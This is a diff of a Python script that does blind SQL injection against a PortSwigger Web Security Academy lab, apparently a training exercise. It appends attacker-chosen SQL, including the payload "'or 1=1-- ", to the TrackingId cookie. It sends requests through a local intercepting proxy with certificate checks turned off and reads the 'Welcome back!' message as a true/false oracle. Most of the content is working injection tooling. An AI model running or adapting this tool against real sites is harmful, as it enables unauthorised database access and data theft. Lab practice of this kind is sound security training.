@@ -14,6 +14,18 @@ import urllib
 import sys
 import re
 
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+
 proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 headers = {
     "Host": "0a3c003f047e86b780bc1ced00270073.web-security-academy.net",
@@ -32,30 +44,38 @@ headers = {
 }
 
 
-def modify_tracking_id(cookie_header, query):
+def modify_tracking_id(cookie_header, query, encode_all=False):
     tracking_id_match = re.search(r'TrackingId=([^;]*)', cookie_header)
 
     if not tracking_id_match:
         raise ValueError("TrackingId not found in the cookie header")
 
     current_tracking_id = tracking_id_match.group(1)
-    encoded_string = urllib.parse.quote(query)
-    
+    if encode_all:
+        encoded_string = urllib.parse.quote(query)
+    else:
+        encoded_string = query.replace(' ', '%20') 
+
     new_tracking_id = f"{current_tracking_id}{encoded_string}"
     new_cookie_header = re.sub(r'TrackingId=[^;]*', f'TrackingId={new_tracking_id}', cookie_header)
     
+    print(bcolors.FAIL + new_cookie_header + bcolors.ENDC)
     return new_cookie_header
 
+
 def response_check():
-    cookie_header = modify_tracking_id(headers['Cookie'], "'or 1=1-- ")
+    url = sys.argv[1]
+    query = sys.argv[2]
+    encode_all = sys.argv[3].lower() == 'true' if len(sys.argv) > 3 else False
+
+    cookie_header = modify_tracking_id(headers['Cookie'], query, encode_all)
     headers['Cookie'] = cookie_header
 
-    response = requests.get(sys.argv[1], headers=headers, proxies=proxies, verify=False)
+    response = requests.get(url, headers=headers, proxies=proxies, verify=False)
     if "Welcome back!" in response.text:
-        print("good")
+        print(bcolors.OKGREEN + "good!" + bcolors.ENDC)
     else:
-        print("no good")
-
+        print(bcolors.FAIL + "no good!" + bcolors.ENDC)
 
     
 if __name__ == '__main__':
